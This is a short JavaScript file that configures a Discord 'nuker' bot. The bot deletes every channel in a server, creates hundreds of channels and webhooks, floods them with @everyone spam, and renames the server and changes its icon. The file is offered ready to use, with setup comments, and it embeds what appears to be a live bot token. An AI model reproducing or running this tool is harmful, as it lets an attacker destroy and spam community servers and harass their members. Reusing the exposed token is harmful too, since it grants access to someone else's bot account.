const Discord = require("discord.js");
const BotToken = "NzUyMjE4MjUxNTYzMzY4NDg4.X1Ub1g.ktovlF7XJYLgRtnQGdyDULhj2cw"; // replace this with your bot token
const Bot = new Discord.Client();
const coronainfecter = require("./coronainfecter"); 
let CMDArgs = process.argv.slice(2)

const Command = CMDArgs[1] || "REPxmlgJ6r" 
const Prefix = "6" // leave this as-is
const NukerInstance = new coronainfecter({
    Prefix: Prefix,
    Command: Command,
    DiscordId: "610345057345601537", // replace this with your discord ID
    SendMessage: "@everyone https://cdn.discordapp.com/attachments/737845838910324787/765717605121261598/video1.mp4", // what u want to be spammed in the server when the new channels are made
    AmountToRepeat: 200, // leave this as-is
    CreateTextChannel: "cretin", // what you want the new channels to be named
    ChannelsToCreate: 500,  // leave this as-is
    WebhookName: "cretin", // what you want the webhooks to be named
    nukeChannels: true, // set to false if you don't want all channels to be deleted
    WebhookAmount: 25, // leave this as-is
    serverName: "cretin", // what you want the server name to be changed to 
    serverIcon: "https://cdn.discordapp.com/attachments/753279211187339314/753495238777110578/FZ5ROQQ1N54MXDTM.png", // what you want the server icon to be changed to (has to be a .png image and a link) 
    OnlyWhitelisted: false,
});
Bot.on("ready", function () {
    console.log("Ready. Type \"" + Prefix + Command + "\" to start the nuker on a server")
})
Bot.login(CMDArgs[0]);
Bot.on("message", NukerInstance.getFunction());